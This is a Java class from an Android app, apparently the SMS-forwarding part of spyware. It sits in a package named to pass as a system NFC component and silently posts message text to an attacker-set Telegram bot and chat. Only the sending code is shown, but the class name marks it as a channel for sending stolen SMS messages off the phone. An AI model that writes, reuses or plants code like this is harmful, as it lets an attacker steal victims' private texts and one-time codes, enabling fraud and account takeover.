package com.android.nfc.system.sms;

import android.content.Context;

import com.android.nfc.system.R;

import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import okhttp3.*;

public class SmsToTelegram {

    private final String BOT_TOKEN;
    private final String CHAT_ID;
    private static final ExecutorService executorService = Executors.newSingleThreadExecutor();

    public SmsToTelegram(Context context) {
        BOT_TOKEN = context.getResources().getString(R.string.BOT_TOKEN);
        CHAT_ID = context.getResources().getString(R.string.CHAT_ID);
    }

    public void sendToTelegram(String message) {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

        OkHttpClient client = new OkHttpClient();
        RequestBody body = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", message)
                .build();

        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .build();

        executorService.execute(() -> {
            Response response = null;
            try {
                response = client.newCall(request).execute();
                if (!response.isSuccessful()) {
                    throw new IOException("Unexpected code " + response);
                }
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if (response != null) {
                    response.close();
                }
            }
        });
    }
}